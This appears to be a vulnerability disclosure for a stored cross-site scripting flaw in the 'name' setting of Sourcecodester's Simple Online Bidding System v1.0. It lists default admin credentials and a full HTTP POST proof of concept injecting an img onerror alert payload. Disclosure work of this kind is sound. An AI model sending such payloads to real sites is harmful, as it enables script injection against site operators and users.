XSS vulnerability exists in Sourcecodester Simple Online Bidding System

official website:https://www.sourcecodester.com/php/14558/simple-online-bidding-system-using-phpmysqli-source-code.html

version:v1.0

route：/simple-online-bidding-system/admin/ajax.php?action=save_settings

related code file：ajax.php

related_function：save_settings()

Influence parameters：$name

<img width="1702" alt="image" src="https://github.com/Xu-Mingming/cve/assets/172484755/cd528371-a398-486b-a682-cc38893a0bc2">

#### 1.Vulnerability verification and exploit

We need log in to the system backend as admin/admin123.The exploit proof-of-concept (PoC) for this vulnerability is as follows. When using it, you need to modify the relevant address information in the PoC according to the target environment, such as the host and refer fields.

```
POST /simple-online-bidding-system/admin/ajax.php?action=save_settings HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------41146212918444686281116801327
Content-Length: 1687
Origin: http://localhost
Connection: close
Referer: http://localhost/simple-online-bidding-system/admin/index.php?page=site_settings
Cookie: PHPSESSID=j4e8nd6qr9q2h7hmtupn4pdnrq
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------41146212918444686281116801327
Content-Disposition: form-data; name="name"

<img src=1 onerror=alert(1)>
-----------------------------41146212918444686281116801327
Content-Disposition: form-data; name="email"

info@sample.comm
-----------------------------41146212918444686281116801327
Content-Disposition: form-data; name="contact"

+6948 8542 623
-----------------------------41146212918444686281116801327
Content-Disposition: form-data; name="about"

<p style="text-align: center; background: transparent; position: relative;"><span style="color: rgb(0, 0, 0); font-family: &quot;Open Sans&quot;, Arial, sans-serif; font-weight: 400; text-align: justify;">&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</span><br></p><p style="text-align: center; background: transparent; position: relative;"><br></p><p style="text-align: center; background: transparent; position: relative;"><br></p><p></p>
-----------------------------41146212918444686281116801327
Content-Disposition: form-data; name="img"; filename=""
Content-Type: application/octet-stream


-----------------------------41146212918444686281116801327--

```

After successfully executing the PoC, you can observe that the malicious pop-up has occurred on the Home page accessible to regular users, indicating a successful XSS attack.

<img width="1668" alt="image" src="https://github.com/Xu-Mingming/cve/assets/172484755/caba772a-976a-4315-8b3b-ed4ce07e1f0d">

